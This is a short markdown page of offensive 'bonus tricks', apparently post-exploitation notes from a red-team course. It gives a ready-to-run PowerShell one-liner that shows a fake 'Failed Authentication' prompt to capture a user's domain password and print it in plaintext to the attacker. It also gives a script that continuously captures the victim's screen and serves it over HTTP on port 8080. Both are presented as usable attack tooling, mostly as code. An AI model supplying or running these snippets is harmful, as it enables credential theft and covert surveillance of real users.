# Bonus Tricks

### Keylogger prompt

This is a neat trick that can be used during desperate times. It will spawn a UI prompt that will ask for the user's domain credentials using environment variables to pull the username, then display the password in plaintext to the attacker console. 

From a CMD.exe prompt:

```powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

- from Sektor7 Privilege Escalation course

### Serving Display on HTTP

This script captures the content of the primary screen, converts it to a JPEG image, and serves it over an HTTP web server on port 8080. The script will continuously update the image and serve it as long as the HTTP listener is running.

```
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:8080/")
$listener.Start()

Write-Host "Streaming server is running on http://localhost:8080/"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $response = $context.Response

    $stream = $response.OutputStream
    $imageStream = New-Object System.IO.MemoryStream

    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)

    $bitmap.Save($imageStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)

    $response.ContentType = "image/jpeg"
    $response.ContentLength64 = $imageStream.Length

    $imageStream.WriteTo($stream)

    $imageStream.Dispose()
    $stream.Dispose()
}

$listener.Stop()

```
